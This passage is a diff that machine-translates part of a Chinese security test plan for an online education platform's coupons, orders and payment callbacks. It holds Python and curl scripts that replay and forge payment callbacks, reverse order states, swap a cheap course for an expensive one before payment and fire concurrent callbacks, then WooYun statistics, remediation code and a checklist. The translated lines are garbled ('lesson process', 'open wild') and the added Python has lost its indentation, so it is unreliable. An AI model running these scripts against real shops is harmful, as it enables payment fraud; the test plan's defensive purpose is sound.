-    print("[1] 原样重放原始回调...")
-    resp = requests.post(CALLBACK_URL, json=ORIGINAL_CALLBACK, verify=False)
-    print(f"    HTTP {resp.status_code}: {resp.text[:200]}")
-    if resp.status_code == 200 and "success" in resp.text.lower():
-        print("    [!] 警告: 回调可被重放（缺少幂等校验）")
+ # test1:principle Replay(CheckIdempotencyness)
+ print("[1] principle Replayprinciple initialCallback...")
+ resp = requests.post(CALLBACK_URL, json=ORIGINAL_CALLBACK, verify=False)
+ print(f" HTTP {resp.status_code}: {resp.text[:200]}")
+ if resp.status_code == 200 and "success" in resp.text.lower():
+ print(" [!] alert report: CallbackCanbeReplay(missing lessIdempotencyValidate)")
 
-    # 测试2：修改 order_id 后重放
-    for target_oid in TARGET_ORDER_IDS:
-        print(f"\n[2] 重放回调，order_id → {target_oid}")
-        tampered = copy.deepcopy(ORIGINAL_CALLBACK)
-        tampered["order_id"] = target_oid
+ # test2:Modify order_id afterReplay
+ for target_oid in TARGET_ORDER_IDS:
+ print(f"\n[2] ReplayCallback, order_id -> {target_oid}")
+ tampered = copy.deepcopy(ORIGINAL_CALLBACK)
+ tampered["order_id"] = target_oid
 
-        resp = requests.post(CALLBACK_URL, json=tampered, verify=False)
-        print(f"    HTTP {resp.status_code}: {resp.text[:200]}")
+ resp = requests.post(CALLBACK_URL, json=tampered, verify=False)
+ print(f" HTTP {resp.status_code}: {resp.text[:200]}")
 
-        if resp.status_code == 200 and "success" in resp.text.lower():
-            print(f"    [!!!] 漏洞确认: 订单 {target_oid} 被标记为已支付！")
-            print(f"         回调签名未校验或未与 order_id 绑定")
+ if resp.status_code == 200 and "success" in resp.text.lower():
+ print(f" [!!!] Vulnerability Confirmation: Order {target_oid} be identifier recordasPaid!")
+ print(f" CallbackSignaturenotValidateornotand order_id Binding")
 
-    # 测试3：去掉签名字段
-    print(f"\n[3] 去掉签名字段后提交...")
-    no_sign = copy.deepcopy(ORIGINAL_CALLBACK)
-    no_sign.pop("sign", None)
-    resp = requests.post(CALLBACK_URL, json=no_sign, verify=False)
-    print(f"    HTTP {resp.status_code}: {resp.text[:200]}")
-    if resp.status_code == 200:
-        print("    [!!!] 漏洞确认: 回调不校验签名！")
+ # test3: SignatureField
+ print(f"\n[3] SignatureFieldafterSubmit...")
+ no_sign = copy.deepcopy(ORIGINAL_CALLBACK)
+ no_sign.pop("sign", None)
+ resp = requests.post(CALLBACK_URL, json=no_sign, verify=False)
+ print(f" HTTP {resp.status_code}: {resp.text[:200]}")
+ if resp.status_code == 200:
+ print(" [!!!] Vulnerability Confirmation: CallbacknotValidateSignature!")
 
-    # 测试4：伪造签名
-    print(f"\n[4] 伪造签名后提交...")
-    fake_sign = copy.deepcopy(ORIGINAL_CALLBACK)
-    fake_sign["order_id"] = TARGET_ORDER_IDS[0]
-    fake_sign["sign"] = hashlib.md5(b"fake").hexdigest()
-    resp = requests.post(CALLBACK_URL, json=fake_sign, verify=False)
-    print(f"    HTTP {resp.status_code}: {resp.text[:200]}")
-    if resp.status_code == 200:
-        print("    [!!!] 漏洞确认: 伪造签名被接受！")
-
+ # test4:forgerySignature
+ print(f"\n[4] forgerySignatureafterSubmit...")
+ fake_sign = copy.deepcopy(ORIGINAL_CALLBACK)
+ fake_sign["order_id"] = TARGET_ORDER_IDS[0]
+ fake_sign["sign"] = hashlib.md5(b"fake").hexdigest()
+ resp = requests.post(CALLBACK_URL, json=fake_sign, verify=False)
+ print(f" HTTP {resp.status_code}: {resp.text[:200]}")
+ if resp.status_code == 200:
+ print(" [!!!] Vulnerability Confirmation: forgerySignaturebe connect affected!")
 
 if __name__ == "__main__":
-    test_callback_replay()
+ test_callback_replay()
 ```
 
-#### TC-STATE-03：订单状态逆向回退
+#### TC-STATE-03:OrderStatus toward return refund
 
-**WooYun 模式：** 状态机绕过 — "能否反向转移？（已支付→待审）"
+**WooYun mode:** State-Machine Bypass - "whether canreverse toward transfer move?(Paid->pending audit)"
 
 ```bash
 #!/bin/bash
-# 订单状态逆向回退测试
+# OrderStatus toward return refund test
 
 BASE_URL="https://edu-platform.example.com/api"
 TOKEN="Bearer <USER_TOKEN>"
 
-echo "[*] TC-STATE-03: 订单状态逆向回退测试"
+echo "[*] TC-STATE-03: OrderStatus toward return refund test"
 echo "========================================="
 
-# 场景A：已完成订单 → 尝试回退到待支付（企图重新使用优惠券）
+# scenario sceneA:CompletedOrder -> Attemptreturn refundtoPending Payment(image serious new useuseCoupon)
 COMPLETED_ORDER="<COMPLETED_ORDER_ID>"
-echo -e "\n[A] 已完成 → 待支付"
-for status in "pending" "unpaid" "待支付" "0"; do
-  echo "  尝试 status=$status ..."
-  curl -s -o /dev/null -w "HTTP %{http_code}" \
-    -X PUT "$BASE_URL/order/$COMPLETED_ORDER/status" \
-    -H "Authorization: $TOKEN" \
-    -H "Content-Type: application/json" \
-    -d "{\"status\": \"$status\"}"
-  echo ""
+echo -e "\n[A] Completed -> Pending Payment"
+for status in "pending" "unpaid" "Pending Payment" "0"; do
+ echo " Attempt status=$status..."
+ curl -s -o /dev/null -w "HTTP %{http_code}" \
+ -X PUT "$BASE_URL/order/$COMPLETED_ORDER/status" \
+ -H "Authorization: $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d "{\"status\": \"$status\"}"
+ echo ""
 done
 
-# 场景B：已支付订单 → 尝试取消并退款（但保留课程访问）
+# scenario sceneB:PaidOrder -> AttemptCancelandRefund(but protect retain lesson process access ask)
 PAID_ORDER="<PAID_ORDER_ID>"
-echo -e "\n[B] 已支付 → 取消+退款"
+echo -e "\n[B] Paid -> Cancel+Refund"
 curl -s -w "\nHTTP %{http_code}\n" \
-  -X POST "$BASE_URL/order/$PAID_ORDER/cancel" \
-  -H "Authorization: $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"reason": "不想学了"}'
+ -X POST "$BASE_URL/order/$PAID_ORDER/cancel" \
+ -H "Authorization: $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"reason": "not done"}'
 
-# 验证：课程是否仍然可以访问
-echo -e "\n[*] 验证课程访问权限是否被回收:"
+# Validate:lesson processwhetherstill Canas access ask
+echo -e "\n[*] Validatelesson process access askPermissionwhetherbe return collect:"
 curl -s "$BASE_URL/course/<COURSE_ID>/access" \
-  -H "Authorization: $TOKEN"
+ -H "Authorization: $TOKEN"
 ```
 
-#### TC-STATE-04：支付前篡改订单内容
+#### TC-STATE-04:Paymentfirst tamper changeOrdercontent
 
-**WooYun 模式：** 业务规则绕过
+**WooYun mode:** Business Rule Bypass
 
 ```python
 #!/usr/bin/env python3
 """
-支付前订单内容篡改测试
-流程：创建低价订单 → 修改为高价课程 → 以低价完成支付
+PaymentfirstOrdercontent tamper change test
+flow process:CreateLowpriceOrder -> ModifyasHighprice lesson process -> asLowprice completePayment
 """
 
 import requests
@@ -596,76 +575,74 @@ import json
 BASE_URL = "https://edu-platform.example.com/api"
 TOKEN = "Bearer <USER_TOKEN>"
 HEADERS = {
-    "Authorization": TOKEN,
-    "Content-Type": "application/json",
+ "Authorization": TOKEN,
+ "Content-Type": "application/json",
 }
 
-CHEAP_COURSE_ID = "COURSE_FREE_TRIAL"   # 免费/低价课程
-EXPENSIVE_COURSE_ID = "COURSE_VIP_9999"  # 高价课程
-
+CHEAP_COURSE_ID = "COURSE_FREE_TRIAL" # avoid fee/Lowprice lesson process
+EXPENSIVE_COURSE_ID = "COURSE_VIP_9999" # Highprice lesson process
 
 def test_order_tampering():
-    print("[*] TC-STATE-04: 支付前篡改订单内容\n")
+ print("[*] TC-STATE-04: Paymentfirst tamper changeOrdercontent\n")
 
-    # 步骤1：创建低价课程订单
-    print("[1] 创建低价课程订单...")
-    resp = requests.post(f"{BASE_URL}/order/create",
-                         headers=HEADERS,
-                         json={"course_id": CHEAP_COURSE_ID})
-    order = resp.json()
-    order_id = order.get("order_id") or order.get("id")
-    amount = order.get("amount", "?")
-    print(f"    订单 {order_id}, 金额: {amount}")
+ # Step1:CreateLowprice lesson processOrder
+ print("[1] CreateLowprice lesson processOrder...")
+ resp = requests.post(f"{BASE_URL}/order/create",
+ headers=HEADERS,
+ json={"course_id": CHEAP_COURSE_ID})
+ order = resp.json()
+ order_id = order.get("order_id") or order.get("id")
+ amount = order.get("amount", "?")
+ print(f" Order {order_id}, Amount: {amount}")
 
-    # 步骤2：尝试修改订单中的课程
-    print(f"\n[2] 尝试将课程替换为高价课程 {EXPENSIVE_COURSE_ID}...")
+ # Step2:AttemptModifyOrderinoflesson process
+ print(f"\n[2] Attemptwilllesson processReplaceasHighprice lesson process {EXPENSIVE_COURSE_ID}...")
 
-    # 方法A：直接修改订单
-    resp_a = requests.put(f"{BASE_URL}/order/{order_id}",
-                          headers=HEADERS,
-                          json={"course_id": EXPENSIVE_COURSE_ID})
-    print(f"    方法A (PUT /order/id): HTTP {resp_a.status_code}")
+ # MethodA:DirectModifyOrder
+ resp_a = requests.put(f"{BASE_URL}/order/{order_id}",
+ headers=HEADERS,
+ json={"course_id": EXPENSIVE_COURSE_ID})
+ print(f" MethodA (PUT /order/id): HTTP {resp_a.status_code}")
 
-    # 方法B：通过购物车修改
-    resp_b = requests.post(f"{BASE_URL}/cart/update",
-                           headers=HEADERS,
-                           json={"order_id": order_id,
-                                 "items": [{"course_id": EXPENSIVE_COURSE_ID,
-                                            "quantity": 1}]})
-    print(f"    方法B (购物车更新): HTTP {resp_b.status_code}")
+ # MethodB:PassShopping CartModify
+ resp_b = requests.post(f"{BASE_URL}/cart/update",
+ headers=HEADERS,
+ json={"order_id": order_id,
+ "items": [{"course_id": EXPENSIVE_COURSE_ID,
+ "quantity": 1}]})
+ print(f" MethodB (Shopping CartUpdate): HTTP {resp_b.status_code}")
 
-    # 步骤3：检查订单当前状态
-    print(f"\n[3] 检查订单当前内容...")
-    resp = requests.get(f"{BASE_URL}/order/{order_id}", headers=HEADERS)
-    current = resp.json()
-    current_course = current.get("course_id", "?")
-    current_amount = current.get("amount", "?")
-    print(f"    课程: {current_course}, 金额: {current_amount}")
+ # Step3:CheckOrderwhen firstStatus
+ print(f"\n[3] CheckOrderwhen first content...")
+ resp = requests.get(f"{BASE_URL}/order/{order_id}", headers=HEADERS)
+ current = resp.json()
+ current_course = current.get("course_id", "?")
+ current_amount = current.get("amount", "?")
+ print(f" lesson process: {current_course}, Amount: {current_amount}")
 
-    if str(current_course) == str(EXPENSIVE_COURSE_ID) and \
-       float(str(current_amount).replace("¥", "")) <= float(str(amount).replace("¥", "")):
-        print(f"\n[!!!] 漏洞确认: 课程已替换为高价课程，但金额未重算！")
-        print(f"      原始金额: {amount}, 当前金额: {current_amount}")
-        print(f"      WooYun 模式: 订单篡改（1,227案例，74.2%高危）")
-
+ if str(current_course) == str(EXPENSIVE_COURSE_ID) and \
+ float(str(current_amount).replace("¥", "")) <= float(str(amount).replace("¥", "")):
+ print(f"\n[!!!] Vulnerability Confirmation: lesson process alreadyReplaceasHighprice lesson process, butAmountnot serious algorithm!")
+ print(f" principle initialAmount: {amount}, when firstAmount: {current_amount}")
+ print(f" WooYun mode: Order Tampering(1,227Case, 74.2%High Risk)")
 
 if __name__ == "__main__":
-    test_order_tampering()
+ test_order_tampering()
 ```
 
 ---
 
-### 4.3 综合竞态 + 状态机组合攻击
+### 4.3 combineRace + Statusmachine array combine attack attack
 
-#### TC-COMBO-01：并发支付 + 重复开通
+#### TC-COMBO-01:Concurrent Payment + serious repeat open wild
 
-**目标：** 使用竞态条件触发一笔支付对应多次课程开通
+**Target:** useuseRace Conditiontrigger initiate one entryPaymentforshouldmanytimeslesson process open wild
 
 ```python
 #!/usr/bin/env python3
 """
-组合攻击：并发触发支付回调 → 多次开通同一课程
-WooYun 模式：竞态条件 + 状态机绕过
+array combine attack attack:Concurrencytrigger initiatePaymentCallback -> manytimesopen wildSamelesson process
+WooYun mode:Race Condition + State-Machine Bypass
 """
 
 import asyncio
@@ -674,211 +651,206 @@ import aiohttp
 CALLBACK_URL = "https://edu-platform.example.com/api/payment/callback"
 CONCURRENT = 15
 
-# 真实支付回调数据（从 Burp 捕获）
+# real realPaymentCallbackData(from Burp)
 CALLBACK_DATA = {
-    "order_id": "ORDER_001",
-    "amount": "99.00",
-    "status": "SUCCESS",
-    "transaction_id": "TXN_REAL_001",
-    "sign": "<REAL_SIGN>",
+ "order_id": "ORDER_001",
+ "amount": "99.00",
+ "status": "SUCCESS",
+ "transaction_id": "TXN_REAL_001",
+ "sign": "<REAL_SIGN>",
 }
 
-
 async def fire_callback(session, req_id, barrier):
-    await barrier.wait()
-    async with session.post(CALLBACK_URL, json=CALLBACK_DATA,
-                            ssl=False) as resp:
-        return {
-            "req_id": req_id,
-            "status": resp.status,
-            "body": (await resp.text())[:300],
-        }
-
+ await barrier.wait()
+ async with session.post(CALLBACK_URL, json=CALLBACK_DATA,
+ ssl=False) as resp:
+ return {
+ "req_id": req_id,
+ "status": resp.status,
+ "body": (await resp.text())[:300],
+ }
 
 async def main():
-    print(f"[*] TC-COMBO-01: 并发支付回调测试 (×{CONCURRENT})")
-    barrier = asyncio.Barrier(CONCURRENT)
-    connector = aiohttp.TCPConnector(limit=0, force_close=True)
+ print(f"[*] TC-COMBO-01: Concurrent PaymentCallbacktest (x{CONCURRENT})")
+ barrier = asyncio.Barrier(CONCURRENT)
+ connector = aiohttp.TCPConnector(limit=0, force_close=True)
 
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = [fire_callback(session, i, barrier) for i in range(CONCURRENT)]
-        results = await asyncio.gather(*tasks)
+ async with aiohttp.ClientSession(connector=connector) as session:
+ tasks = [fire_callback(session, i, barrier) for i in range(CONCURRENT)]
+ results = await asyncio.gather(*tasks)
 
-    success = [r for r in results if r["status"] == 200]
-    print(f"\n[*] 成功响应: {len(success)} / {CONCURRENT}")
+ success = [r for r in results if r["status"] == 200]
+ print(f"\n[*] SuccessResponse: {len(success)} / {CONCURRENT}")
 
-    if len(success) > 1:
-        print(f"[!!!] 漏洞确认: 回调被处理 {len(success)} 次！")
-        print(f"      可能导致: 重复开通、余额多次入账、积分多次发放")
-        print(f"      根因: 回调处理缺少幂等控制（无分布式锁/唯一事务ID）")
-
+ if len(success) > 1:
+ print(f"[!!!] Vulnerability Confirmation: Callbackbe handle manage {len(success)} times!")
+ print(f" CancanCausing: serious repeat open wild/Balancemanytimesinject account/ part manytimesinitiate release")
+ print(f" root because: Callbackhandle manage missing lessIdempotencycontrol make(noDistributed Lock/ one event serviceID)")
 
 if __name__ == "__main__":
-    asyncio.run(main())
+ asyncio.run(main())
 ```
 
 ---
 
-## 五、WooYun 案例参考与统计
+## 5. WooYun Case ReferencesandStatistics
 
-### 5.1 直接相关案例
+### 5.1 Directrelated keyCase
 
-| 案例名称 | 漏洞类型 | 严重级别 | 与本测试的关联 |
+| Casename name | Vulnerability Type | Severity | andversion testofkey connect |
 |----------|---------|---------|---------------|
-| M1905电影网价值2588套餐只要5毛钱 | 订单篡改/状态机绕过 | 高危 | 订单自批准绕过支付，与 TC-STATE-01 对应 |
-| 114票务网某站逻辑漏洞利用支付超时导致上万用户敏感信息泄漏 | 状态机缺陷 | 高危 | 超时状态下的异常转移，与 TC-STATE-03 对应 |
-| 大特宝官网业务逻辑漏洞可免费甚至低款买保险 | 业务规则绕过 | 高危 | 低价购买高价商品，与 TC-STATE-04 对应 |
-| 丽子美妆某处严重逻辑漏洞 | 业务规则绕过 | 高危 | 电商逻辑绕过，与优惠券/价格漏洞对应 |
-| 超级课程表某主营业务逻辑缺陷导致全体用户真实姓名手机和QQ泄露 | 设计缺陷 | 高危 | 教育平台同类业务，设计层面缺陷 |
+| M1905Movie site value2588Packageonly costs5jiao | Order Tampering/State-Machine Bypass | High Risk | Orderself batch accurateBypassPayment, and TC-STATE-01 forshould |
+| 114Ticketing site logic flaw used payment timeout to leak sensitive information for tens of thousands of users | Statusmachine missing flaw | High Risk | super timeStatusunderofabnormal common transfer move, and TC-STATE-03 forshould |
+| Datebao official site business-logic vulnerability allowed buying insurance for free or at an extremely low price | Business Rule Bypass | High Risk | Lowprice buy buyHighprice commerce product, and TC-STATE-04 forshould |
+| sub a locationSeverelogic logic vulnerability | Business Rule Bypass | High Risk | electronic commerce logic logicBypass, andCoupon/price format vulnerability forshould |
+| super level lesson process table some primary business logic logic missing flawCausingall bodyUserreal realNamemobile machineandQQDisclosure | Design Flaw | High Risk | lesson Platformsame type business, set plan layer page missing flaw |
 
-### 5.2 统计数据支撑
+### 5.2 StatisticsDatasupport
 
-| 指标 | 数据 | 来源 |
+| specified identifier | Data | come source |
 |------|------|------|
-| 竞态条件案例总数 | 266 个 | WooYun 逻辑流领域 |
-| 竞态条件高危占比 | **74.8%** | WooYun 数据集 |
-| 状态机绕过案例总数 | 1,391 个 | WooYun 逻辑流领域 |
-| 状态机绕过高危占比 | **65.3%** | WooYun 数据集 |
-| 订单篡改案例总数 | 1,227 个 | WooYun 金融领域 |
-| 订单篡改高危占比 | **74.2%** | WooYun 数据集 |
-| 支付绕过案例总数 | 1,056 个 | WooYun 金融领域 |
-| 支付绕过高危占比 | **68.7%** | WooYun 数据集 |
-| 逻辑漏洞整体高危率 | **74.8%** | WooYun 逻辑流领域 266 案例 |
-| 金融漏洞整体高危率 | **68-83%** | WooYun 金融领域 2,919 案例 |
+| Race ConditionCasetotal number | 266 | WooYun Logic Flow Domain |
+| Race Conditionhigh-risk percentage | **74.8%** | WooYun Datacollect |
+| State-Machine BypassCasetotal number | 1,391 | WooYun Logic Flow Domain |
+| State-Machine Bypasshigh-risk percentage | **65.3%** | WooYun Datacollect |
+| Order TamperingCasetotal number | 1,227 | WooYun Financial Domain |
+| Order Tamperinghigh-risk percentage | **74.2%** | WooYun Datacollect |
+| Payment BypassCasetotal number | 1,056 | WooYun Financial Domain |
+| Payment Bypasshigh-risk percentage | **68.7%** | WooYun Datacollect |
+| logic logic vulnerability integer bodyHigh Riskrate | **74.8%** | WooYun Logic Flow Domain 266 Case |
+| Financialvulnerability integer bodyHigh Riskrate | **68-83%** | WooYun Financial Domain 2,919 Case |
 
-> **关键洞察：** 竞态条件虽然案例数仅占 266 个（逻辑流领域的 15.8%），但高危率达 74.8%，在所有逻辑漏洞子类中排名第一。这意味着一旦存在竞态条件，几乎必然导致严重后果。
+> **key hole:** Race Condition Case Countonly share 266 (Logic Flow Domainof 15.8%), butHigh Riskrate reach 74.8%, inAlllogic logic vulnerability sub typeinrank nameNo. one.this meaning one existinRace Condition, must CausingSevereafter if.
 
 ---
 
-## 六、漏洞判定标准与影响评估矩阵
+## 6. vulnerabilityPass/Fail Criteriaandimpact response assess assess matrix matrix
 
-| 测试编号 | 漏洞判定条件 | 严重级别 | 业务影响 |
+| Test ID | vulnerability determine set condition | Severity | Business Impact |
 |---------|-------------|---------|---------|
-| TC-RACE-01 | 成功领取 > 1 张 | **高危** | 单用户无限套利，优惠券体系崩溃 |
-| TC-RACE-02 | 实际发放 > 限额 | **高危** | 平台超额补贴，直接经济损失 |
-| TC-RACE-03 | 优惠券应用于 > 1 个订单 | **高危** | 优惠券双花，订单收入损失 |
-| TC-STATE-01 | 未支付订单变为已完成/课程已开通 | **严重** | 免费获取付费课程，核心收入损失 |
-| TC-STATE-02 | 篡改后回调被接受 | **严重** | 一次支付无限开通，支付体系被击穿 |
-| TC-STATE-03 | 已完成订单可回退 + 课程仍可访问 | **高危** | 退款不回收权限，资金损失 |
-| TC-STATE-04 | 课程已替换但金额未变 | **高危** | 低价购买高价课程 |
-| TC-COMBO-01 | 回调被多次处理 | **严重** | 余额/积分/课程多次入账 |
+| TC-RACE-01 | Successdomain take > 1 items | **High Risk** | singleUserno limit exploit, Couponbody system |
+| TC-RACE-02 | real actual initiate release > limit amount | **High Risk** | Platformsuper amount supplement, Directfinancial loss |
+| TC-RACE-03 | CouponApplicationfor > 1 Order | **High Risk** | Coupondual flower, Ordercollect inject loss loss |
+| TC-STATE-01 | notPaymentOrderchangeasCompleted/lesson process already open wild | **Severe** | avoid feeObtainpaid lesson process, audit core collect inject loss loss |
+| TC-STATE-02 | tamper change afterCallbackbe connect affected | **Severe** | onetimesPaymentno limit open wild, Paymentbody system be attack |
+| TC-STATE-03 | CompletedOrderCanreturn refund + lesson process stillCanaccess ask | **High Risk** | Refundnot return collectPermission, resource funds loss loss |
+| TC-STATE-04 | lesson process alreadyReplacebutAmountnot change | **High Risk** | Lowprice buy buyHighprice lesson process |
+| TC-COMBO-01 | Callbackbe manytimeshandle manage | **Severe** | Balance/ part/lesson process manytimesinject account |
 
 ---
 
-## 七、修复建议
+## 7. Remediation Recommendation
 
-### 7.1 竞态条件防御（优惠券领取）
+### 7.1 Race Conditiondefense defense(Coupondomain take)
 
 ```sql
--- 方案1：数据库唯一约束（最简单有效）
+-- method plan1:Databaseunique constraint(most simple singleValid)
 ALTER TABLE user_coupons ADD UNIQUE INDEX uk_user_coupon (user_id, coupon_id);
 
--- 方案2：原子操作（INSERT ... ON DUPLICATE KEY / INSERT IGNORE）
+-- method plan2:principle sub operation(INSERT... ON DUPLICATE KEY / INSERT IGNORE)
 INSERT IGNORE INTO user_coupons (user_id, coupon_id, created_at)
 VALUES (#{userId}, #{couponId}, NOW());
--- affected_rows == 1 → 领取成功
--- affected_rows == 0 → 已领取过
+-- affected_rows == 1 -> domain takeSuccess
+-- affected_rows == 0 -> already domain take through
 
--- 方案3：限量券的原子扣减
+-- method plan3:limit quantity couponofprinciple sub deduct reduce
 UPDATE coupons SET remaining = remaining - 1
 WHERE coupon_id = #{couponId} AND remaining > 0;
--- affected_rows == 1 → 库存充足，继续发放
+-- affected_rows == 1 -> Inventorytopup, continue initiate release
 ```
 
 ```python
-# 方案4：Redis 分布式锁（高并发场景）
+# method plan4:Redis Distributed Lock(HighConcurrencyscenario scene)
 import redis
 
 r = redis.Redis()
 lock_key = f"coupon:claim:{user_id}:{coupon_id}"
 
-# SETNX 原子操作
-if r.set(lock_key, "1", nx=True, ex=30):  # 30秒过期
-    try:
-        # 执行领取逻辑
-        claim_coupon(user_id, coupon_id)
-    finally:
-        r.delete(lock_key)
+# SETNX principle sub operation
+if r.set(lock_key, "1", nx=True, ex=30): # 30 expired
+ try:
+ # Executedomain take logic logic
+ claim_coupon(user_id, coupon_id)
+ finally:
+ r.delete(lock_key)
 else:
-    raise DuplicateClaimError("请勿重复领取")
+ raise DuplicateClaimError("please serious repeat domain take")
 ```
 
-### 7.2 状态机防御（订单流转）
+### 7.2 Statusmachine defense defense(Orderflow transfer)
 
 ```python
-# 服务端有限状态机（白名单转换）
+# Serverhas limitStatusmachine(Whitelisttransfer change)
 VALID_TRANSITIONS = {
-    "created":    ["pending_payment"],
-    "pending_payment": ["paid", "cancelled"],
-    "paid":       ["enrolled", "refund_pending"],
-    "enrolled":   ["completed"],
-    "refund_pending": ["refunded"],
-    "cancelled":  [],      # 终态，不可再转
-    "refunded":   [],      # 终态，不可再转
-    "completed":  [],      # 终态，不可再转
+ "created": ["pending_payment"],
+ "pending_payment": ["paid", "cancelled"],
+ "paid": ["enrolled", "refund_pending"],
+ "enrolled": ["completed"],
+ "refund_pending": ["refunded"],
+ "cancelled": [], # final state, notCanagain transfer
+ "refunded": [], # final state, notCanagain transfer
+ "completed": [], # final state, notCanagain transfer
 }
 
 def transition_order(order, new_status):
-    current = order.status
-    allowed = VALID_TRANSITIONS.get(current, [])
-    if new_status not in allowed:
-        raise InvalidTransitionError(
-            f"非法状态转移: {current} → {new_status}，"
-            f"允许的目标状态: {allowed}"
-        )
-    # 执行转移...
+ current = order.status
+ allowed = VALID_TRANSITIONS.get(current, [])
+ if new_status not in allowed:
+ raise InvalidTransitionError(f"Non-methodStatustransfer move: {current} -> {new_status}, "
+ f"allow allowofTargetStatus: {allowed}")
+ # Executetransfer move...
 ```
 
-### 7.3 支付回调防御
+### 7.3 PaymentCallbackdefense defense
 
 ```python
-# 1. 签名验证（必须）
-# 2. 幂等性校验（必须）
-# 3. 金额匹配验证（必须）
+# 1. SignatureValidate(must)
+# 2. IdempotencynessValidate(must)
+# 3. Amountmatch configValidate(must)
 
 def handle_payment_callback(data):
-    # Step 1: 验证签名
-    if not verify_gateway_signature(data):
-        raise SecurityError("签名校验失败")
+ # Step 1: ValidateSignature
+ if not verify_gateway_signature(data):
+ raise SecurityError("SignatureValidateFailure")
 
-    # Step 2: 幂等性 — 检查是否已处理
-    if CallbackLog.exists(transaction_id=data["transaction_id"]):
-        return {"status": "already_processed"}  # 幂等返回
+ # Step 2: Idempotencyness - Checkwhetheralready handle manage
+ if CallbackLog.exists(transaction_id=data["transaction_id"]):
+ return {"status": "already_processed"} # IdempotencyReturn
 
-    # Step 3: 金额匹配
-    order = Order.get(data["order_id"])
-    if order.amount != Decimal(data["amount"]):
-        raise SecurityError("金额不匹配")
+ # Step 3: Amountmatch config
+ order = Order.get(data["order_id"])
+ if order.amount!= Decimal(data["amount"]):
+ raise SecurityError("Amountnot match config")
 
-    # Step 4: 状态校验
-    if order.status != "pending_payment":
-        raise SecurityError(f"订单状态异常: {order.status}")
+ # Step 4: StatusValidate
+ if order.status!= "pending_payment":
+ raise SecurityError(f"OrderStatusabnormal common: {order.status}")
 
-    # Step 5: 在事务中原子更新
-    with db.transaction():
-        order.update(status="paid")
-        CallbackLog.create(transaction_id=data["transaction_id"])
-        enroll_user(order.user_id, order.course_id)
+ # Step 5: inevent serviceinprinciple subUpdate
+ with db.transaction():
+ order.update(status="paid")
+ CallbackLog.create(transaction_id=data["transaction_id"])
+ enroll_user(order.user_id, order.course_id)
 ```
 
 ---
 
-## 八、测试执行检查清单
+## 8. testExecuteCheckclear single
 
-- [ ] **环境确认：** 在测试/预发布环境执行，禁止直接测试生产环境
-- [ ] **数据备份：** 测试前备份相关数据库表
-- [ ] **TC-RACE-01：** 单用户并发领券（20并发）
-- [ ] **TC-RACE-02：** 多用户抢限量券（用户数 > 券总量）
-- [ ] **TC-RACE-03：** 单次使用券并发应用到多订单
-- [ ] **TC-STATE-01：** 跳步测试（跳过支付直接开通）
-- [ ] **TC-STATE-02：** 支付回调重放与伪造
-- [ ] **TC-STATE-03：** 订单状态逆向回退
-- [ ] **TC-STATE-04：** 支付前篡改订单内容
-- [ ] **TC-COMBO-01：** 并发支付回调
-- [ ] **结果记录：** 每个用例的请求/响应截图
-- [ ] **数据验证：** 测试后检查数据库中的实际状态（余额、券数、订单状态）
-- [ ] **清理：** 测试完毕后回滚测试数据
+- [] **environment environmentConfirm:** intest/expected initiate deploy environment environmentExecute, disable stopDirecttest generate asset environment environment
+- [] **Dataprepare copy:** test first prepare copy related keyDatabasetable
+- [] **TC-RACE-01:** singleUserConcurrencydomain coupon(20Concurrency)
+- [] **TC-RACE-02:** manyUser limit quantity coupon(Usernumber > coupon total quantity)
+- [] **TC-RACE-03:** singletimesuseusecouponConcurrencyApplicationtomanyOrder
+- [] **TC-STATE-01:** skip step test(skip throughPaymentDirectopen wild)
+- [] **TC-STATE-02:** PaymentCallbackReplayandforgery
+- [] **TC-STATE-03:** OrderStatus toward return refund
+- [] **TC-STATE-04:** Paymentfirst tamper changeOrdercontent
+- [] **TC-COMBO-01:** Concurrent PaymentCallback
+- [] **ResultRecord:** EachusecasesofRequest/Responseintercept image
+- [] **DataValidate:** test afterCheckDatabaseinofreal actualStatus(Balance/coupon number/OrderStatus)
+- [] **clear manage:** test complete after return Test Data
 
 ---
 
-*方法论来源：WooYun 漏洞数据库（2010-2016），22,132 个真实案例 | 逻辑流领域 1,679 案例 | 金融领域 2,919 案例*
+*Methodcomment come source:WooYun vulnerabilityDatabase(2010-2016), 22,132 real realCase | Logic Flow Domain 1,679 Case | Financial Domain 2,919 Case*
